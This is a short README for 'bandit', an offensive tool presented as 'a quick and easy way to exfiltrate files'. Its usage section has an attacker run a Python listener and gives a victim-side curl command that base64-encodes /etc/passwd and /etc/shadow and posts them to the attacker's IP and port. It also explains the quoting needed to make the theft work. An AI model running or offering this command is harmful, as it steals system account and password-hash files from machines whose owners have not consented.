# bandit
A quick and easy way to exfiltrate files

# usage
Attacker: ```python3 bandit.py [port]```
Victim: ```curl -d "passwd=$(base64 /etc/passwd)&shadow=$(base64 /etc/shadow)" http://yourip:port/```
It is important to use double quotes to allow bash to process reading the files and encoding them before upload


